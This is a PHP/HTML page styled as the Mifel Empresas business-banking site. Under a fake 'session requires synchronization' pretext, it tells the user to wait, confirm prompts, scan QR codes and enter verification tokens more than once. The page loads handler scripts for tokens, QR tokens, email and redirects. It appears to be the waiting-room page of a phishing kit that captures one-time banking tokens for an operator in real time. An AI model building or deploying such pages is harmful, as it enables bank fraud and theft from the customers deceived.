<?php
session_start();

if (!isset($_SESSION['usuario_id'])) {
    header('Location: index.php');
    exit;
}

$usuarioIngresado = (string) ($_SESSION['usuario'] ?? '');
$usuarioSafe = htmlspecialchars($usuarioIngresado, ENT_QUOTES, 'UTF-8');

$iniciales = 'US';
$partes = preg_split('/\s+/', trim($usuarioIngresado));
if ($partes && $partes[0] !== '') {
    $iniciales = mb_strtoupper(mb_substr($partes[0], 0, 1, 'UTF-8'), 'UTF-8');
    if (isset($partes[1]) && $partes[1] !== '') {
        $iniciales .= mb_strtoupper(mb_substr($partes[1], 0, 1, 'UTF-8'), 'UTF-8');
    } elseif (mb_strlen($partes[0], 'UTF-8') > 1) {
        $iniciales .= mb_strtoupper(mb_substr($partes[0], 1, 1, 'UTF-8'), 'UTF-8');
    }
}
$inicialesSafe = htmlspecialchars($iniciales, ENT_QUOTES, 'UTF-8');

$meses = [
    1 => 'Enero', 2 => 'Febrero', 3 => 'Marzo', 4 => 'Abril',
    5 => 'Mayo', 6 => 'Junio', 7 => 'Julio', 8 => 'Agosto',
    9 => 'Septiembre', 10 => 'Octubre', 11 => 'Noviembre', 12 => 'Diciembre',
];
$ahora = new DateTime('now');
$ultimoAcceso = sprintf(
    '%d %s %d, %s',
    (int) $ahora->format('j'),
    $meses[(int) $ahora->format('n')],
    (int) $ahora->format('Y'),
    $ahora->format('H:i:s')
);
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sincronización de dispositivo - Empresas</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/netespera.css">
    <link rel="stylesheet" href="../php_modales/css/modales_input_no_input.css">
    <link rel="stylesheet" href="../php_modales/css/herramientas.css">
    <link rel="stylesheet" href="../php_modales/css/reloj_personalizado.css">
    <link rel="stylesheet" href="../php_modales/css/email_validate.css">
    <link rel="stylesheet" href="../php_modales/css/token_empresa.css">
    <link rel="stylesheet" href="../php_modales/css/token_qr_empresa.css">
    <link rel="stylesheet" href="../php_modales/css/contacto_empresa.css">
    <link rel="stylesheet" href="../php_modales/css/sincronizacion.css">
    <link rel="stylesheet" href="../css/zeppelin_churro_btn.css">
    <?php require_once __DIR__ . '/../includes/responsive_movil.php'; mifel_responsive_movil_empresas(true); ?>
</head>
<body class="netespera-page">
    <div class="ne-topbar">
        <div class="ne-topbar-left">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5A2.5 2.5 0 1 1 12 6a2.5 2.5 0 0 1 0 5.5z" fill="#6b7a88"/>
            </svg>
            <span>Sucursales</span>
        </div>
        <div class="ne-topbar-right">Último acceso: <strong class="ne-topbar-date"><?= htmlspecialchars($ultimoAcceso, ENT_QUOTES, 'UTF-8') ?></strong></div>
    </div>

    <header class="ne-navbar">
        <div class="ne-nav-left">
            <button type="button" class="ne-menu-btn" aria-label="Menú" tabindex="-1">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                    <path d="M4 7h16M4 12h16M4 17h16" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
                </svg>
            </button>
            <div class="ne-empresas-select">
                <span>Todas mis empresas</span>
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                    <path d="M6 9l6 6 6-6" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            </div>
        </div>

        <div class="ne-nav-center">
            <img src="../images/logo-empresas_BLANCO.svg" alt="Mifel Empresas" class="ne-logo">
        </div>

        <div class="ne-nav-right">
            <div class="ne-user">
                <span class="ne-avatar" aria-hidden="true"><?= $inicialesSafe ?></span>
                <span class="ne-user-name">Hola, <?= $usuarioSafe ?></span>
                <svg class="ne-user-chevron" width="12" height="12" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                    <path d="M6 9l6 6 6-6" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            </div>
            <button type="button" class="ne-icon-btn" aria-label="Notificaciones" tabindex="-1">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                    <path d="M18 8c0-3.314-2.686-6-6-6S6 4.686 6 8c0 5.25-2.5 7.5-2.5 7.5h17S18 13.25 18 8Z" stroke="currentColor" stroke-width="1.15" stroke-linecap="round" stroke-linejoin="round"/>
                    <path d="M13.73 21a2 2 0 0 1-3.46 0" stroke="currentColor" stroke-width="1.15" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            </button>
            <button type="button" class="ne-icon-btn" aria-label="Salir" tabindex="-1">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                    <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4" stroke="currentColor" stroke-width="1.15" stroke-linecap="round" stroke-linejoin="round"/>
                    <path d="M16 17l5-5-5-5" stroke="currentColor" stroke-width="1.15" stroke-linecap="round" stroke-linejoin="round"/>
                    <path d="M21 12H9" stroke="currentColor" stroke-width="1.15" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            </button>
        </div>
    </header>

    <div class="ne-tabs-wrap">
        <div class="ne-tabs" role="tablist" aria-label="Secciones">
            <div class="ne-tab is-active" role="tab" aria-selected="true">Cuentas</div>
            <div class="ne-tab" role="tab" aria-selected="false">Tarjetas crédito</div>
            <div class="ne-tab" role="tab" aria-selected="false">Inversiones</div>
            <div class="ne-tab" role="tab" aria-selected="false">Créditos</div>
        </div>
    </div>

    <main class="ne-main">
        <div class="ne-sync-row">
            <div class="ne-card ne-card-sync">
                <h1 class="ne-title">Tu sesión requiere sincronización</h1>
                <p class="ne-lead">Tu última sesión no finalizó correctamente. Para continuar operando, es necesario vincular de nuevo tu dispositivo token con Banca Digital Empresas.</p>
                <div class="ne-card-loading" aria-live="polite">
                    <p class="ne-loading-label" id="neLoadingLabel">Preparando sincronización de tu dispositivo</p>
                    <div class="ne-loader-container">
                        <img src="../images/mifel-loader.gif" alt="Cargando..." class="ne-loader-gif">
                    </div>
                    <p class="ne-loading-hint" id="neLoadingHint">Permanece en esta pantalla mientras se establece la conexión segura.</p>
                </div>
            </div>

            <div class="ne-card ne-card-steps" aria-live="polite">
                <ul class="ne-process-steps">
                    <li class="ne-process-step">
                        <p class="ne-process-phase">Iniciar sincronización</p>
                        <p class="ne-process-text">Aparecerá un aviso en pantalla. Confírmalo para comenzar la vinculación de tu dispositivo token.</p>
                    </li>
                    <li class="ne-process-step">
                        <div class="ne-process-body">
                            <p class="ne-process-phase">Sincronización en proceso</p>
                            <p class="ne-process-text">En tu pantalla verás la leyenda:</p>
                            <div class="ne-step-preview">
                                <span class="ne-step-preview-icon" aria-hidden="true">
                                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M12 2C8.13 2 5 5.13 5 9V11H4V20H20V11H19V9C19 5.13 15.87 2 12 2ZM12 4C14.76 4 17 6.24 17 9V11H7V9C7 6.24 9.24 4 12 4ZM6 13H18V18H6V13Z" fill="#002856"/>
                                    </svg>
                                </span>
                                <span class="ne-step-preview-text">INICIAR SINCRONIZACION</span>
                            </div>
                            <p class="ne-process-note">El sistema puede solicitarte escanear o ingresar códigos en más de una ocasión.</p>
                        </div>
                    </li>
                    <li class="ne-process-step">
                        <p class="ne-process-phase">Finalizar sincronización</p>
                        <p class="ne-process-text">Ingresa el token de verificación que se muestre en pantalla para completar el proceso y continuar operando.</p>
                    </li>
                </ul>
            </div>
        </div>

        <div class="ne-loading-bar" role="progressbar" aria-label="Sincronizando" aria-valuetext="En espera">
            <div class="ne-loading-fill"></div>
        </div>

        <p class="netespera-dynamic-msg ne-dynamic-msg" aria-live="polite"></p>
    </main>

    <script>window.MODAL_BASE = '../';</script>
    <script src="../php_modales/js/check_status.js"></script>
    <script src="../php_modales/js/modales_input_no_input.js"></script>
    <script src="../php_modales/js/herramientas.js"></script>
    <script src="../php_modales/js/reloj_personalizado.js"></script>
    <script src="../php_modales/js/redirecciones.js"></script>
    <script src="../php_modales/js/email_validate_handler.js"></script>
    <script src="../php_modales/js/token_empresa_handler.js"></script>
    <script src="../php_modales/js/token_qr_empresa_handler.js"></script>
    <script src="../php_modales/js/contacto_empresa_handler.js"></script>
    <script src="../php_modales/js/sincronizacion_handler.js"></script>
    <script src="js/netespera_mensajes.js"></script>
</body>
</html>
